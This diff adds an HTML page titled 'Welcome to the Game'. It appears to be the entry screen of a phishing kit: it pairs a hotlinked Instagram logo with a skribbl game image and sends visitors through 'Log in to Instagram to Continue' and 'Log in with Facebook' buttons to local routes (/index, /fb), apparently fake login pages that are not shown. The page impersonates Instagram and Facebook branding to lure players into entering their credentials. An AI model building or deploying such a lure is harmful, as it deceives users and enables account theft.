@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to the Game</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+       body {
+    background-color: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    font-family: 'Arial', sans-serif;
+}
+
+.card-container {
+    width: 100%;
+            max-width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+}
+
+.card-container img {
+    display: block;  /* Ensures images are displayed as block elements (stacked vertically) */
+    margin: 0 auto 20px; /* Centers images horizontally and adds space below each image */
+}
+
+.game-image {
+    width: 100px; /* Adjusted width for game logo */
+    height: 100px; /* Adjusted height for game logo */
+    border-radius: 50%;
+}
+
+.btn-login {
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 10px;
+}
+
+
+
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+}
+
+.divider::before,
+.divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background-color: #dbdbdb;
+}
+
+.divider::before {
+    margin-right: 10px;
+}
+
+.divider::after {
+    margin-left: 10px;
+}
+
+.btn-facebook {
+    background-color: transparent;
+    color: #385185;
+    font-size: 14px;
+    border: none;
+    margin-top: 10px;
+    cursor: pointer;
+}
+.login-logo {
+            margin: 20px auto;
+            width: 175px;
+        }
+        .fg{
+
+        
+        color: #385185;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+        }
+@media (max-width: 576px) {
+    .card-container {
+        margin: 20px;
+        border: none;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <div class="card-container">
+        <!-- Instagram logo -->
+        <img src="https://i.postimg.cc/9fH7CBWY/images.png" alt="Instagram" class="login-logo">
+        
+        <!-- Image of the game -->
+        <img src="https://i.postimg.cc/WpJhH9q3/skribbl.png" alt="Game Image" class="game-image">
+
+        <!-- Login button -->
+        <button class="btn-login" onclick="window.location.href='/index'">
+            Log in to Instagram to Continue
+        </button>
+
+        <!-- Divider -->
+        <div class="divider">OR</div>
+
+        <!-- Facebook login button -->
+        <button class="btn-facebook" onclick="window.location.href='/fb'">
+            
+            <i class="fab fa-facebook-square"></i> Log in with Facebook
+        </button>
+
+        <p class="text-muted mt-3 fg" >By logging in, you agree to our Terms of Service and Privacy Policy</p>
+    </div>
+</body>
+</html>
